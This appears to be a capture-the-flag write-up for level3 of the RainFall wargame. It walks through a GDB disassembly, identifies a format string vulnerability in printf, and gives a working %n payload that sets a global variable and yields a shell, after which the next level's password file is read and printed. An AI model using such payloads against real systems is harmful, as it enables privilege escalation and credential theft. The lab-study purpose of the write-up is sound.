# Level3

## Exploring the binary
```shell
level3@RainFall:~$ ./level3
phantom
phantom
level3@RainFall:~$ ./level3
society42
society42
```
Similar to the <code>level2</code> binary, our executable waits for standard input and then prints it out.

## GDB analysis
```shell
(gdb) disas main
Dump of assembler code for function main:
   0x0804851a <+0>:		push   %ebp
   0x0804851b <+1>:		mov    %esp,%ebp
   0x0804851d <+3>:		and    $0xfffffff0,%esp
   0x08048520 <+6>:		call   0x80484a4 <v>
   0x08048525 <+11>:	leave
   0x08048526 <+12>:	ret
End of assembler dump.
```
The main function calls <code>v()</code> only upon execution.
```shell
(gdb) disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:		push   %ebp
   0x080484a5 <+1>:		mov    %esp,%ebp
   0x080484a7 <+3>:		sub    $0x218,%esp
   0x080484ad <+9>:		mov    0x8049860,%eax
   0x080484b2 <+14>:	mov    %eax,0x8(%esp)
   0x080484b6 <+18>:	movl   $0x200,0x4(%esp)
   0x080484be <+26>:	lea    -0x208(%ebp),%eax
   0x080484c4 <+32>:	mov    %eax,(%esp)
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:	mov    %eax,(%esp)
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    0x804988c,%eax
   0x080484df <+59>:	cmp    $0x40,%eax
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    0x8049880,%eax
   0x080484e9 <+69>:	mov    %eax,%edx
   0x080484eb <+71>:	mov    $0x8048600,%eax
   0x080484f0 <+76>:	mov    %edx,0xc(%esp)
   0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
   0x080484fc <+88>:	movl   $0x1,0x4(%esp)
   0x08048504 <+96>:	mov    %eax,(%esp)
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	movl   $0x804860d,(%esp)
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave
   0x08048519 <+117>:	ret
End of assembler dump.
```
Further inspection of the function draws our attention to <code>0x080484da</code>, where a variable at <code>0x804988c</code> is moved into <code>eax</code> and compared against <code>0x40</code>.
```shell
(gdb) x/s 0x804988c
0x804988c <m>:	 ""
(gdb) print 0x40
$1 = 64
```
This means there is a variable <code>m</code> which we have to modify without having any direct access to it. We check for its existence:
``` shell
(gdb) i var
All defined variables:

Non-debugging symbols:
0x080485f8  _fp_hw
0x080485fc  _IO_stdin_used
0x08048734  __FRAME_END__
0x08049738  __CTOR_LIST__
0x08049738  __init_array_end
0x08049738  __init_array_start
0x0804973c  __CTOR_END__
0x08049740  __DTOR_LIST__
0x08049744  __DTOR_END__
0x08049748  __JCR_END__
0x08049748  __JCR_LIST__
0x0804974c  _DYNAMIC
0x08049818  _GLOBAL_OFFSET_TABLE_
0x0804983c  __data_start
0x0804983c  data_start
0x08049840  __dso_handle
0x08049860  stdin@@GLIBC_2.0
0x08049880  stdout@@GLIBC_2.0
0x08049884  completed.6159
0x08049888  dtor_idx.6161
0x0804988c  m
```
Since <code>fgets()</code> is used to gather the input, buffer overflow attacks are no longer an option. While 520 bytes are allocated for the buffer (+26), the size of the input read is set to 512 bytes, effectively protecting it. The entire input string is then displayed using <code>printf()</code>, which introduces a vulnerability to a <code>format string</code> attack.

## format string attack
When the input containing format strings is passed to <code>printf()</code>, it is processed and displayed as output. If the input aligns with the expected format specifiers, it is printed correctly. However, if the input includes malicious format specifiers, it can be exploited to manipulate the output or the program's behavior. Since we know the address of <code>m</code>, we will use <code>printf()</code> to modify its value.

The format string vulnerability arises because the program utilizes user input directly in the <code>printf</code> function without adequate sanitization. By passing a string to the function and printing numerous stack addresses (<code>%p</code>) following this string, we can determine the specific stack parameter it occupies.

``` shell
level3@RainFall:~$ python -c 'print "AAAA" + " %p" * 5' > /tmp/pattern3
level3@RainFall:~$ cat /tmp/pattern3 - | ./level3
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520
```
We found success with just 5 addresses and discovered that the string <code>AAAA</code> resides in the fourth position. With our understanding of the format string's location in the stack, our next step is to craft a string 64 characters in length, embedding the address of the variable (<code>0x0804988c</code>) crucial for triggering the shell. Subsequently, we leverage the <code>%n</code> specifier to write this length to the specified address - when the format string <code>%4$n</code> is used, printf will write the number of characters printed so far into the memory location specified by the fourth argument.

## Exploit
``` shell
level3@RainFall:~$ python -c 'print "\x08\x04\x98\x8c"[::-1] + "F"*60 + "%4$n"' > /tmp/flag3
level3@RainFall:~$ cat /tmp/flag3 - | ./level3
�FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
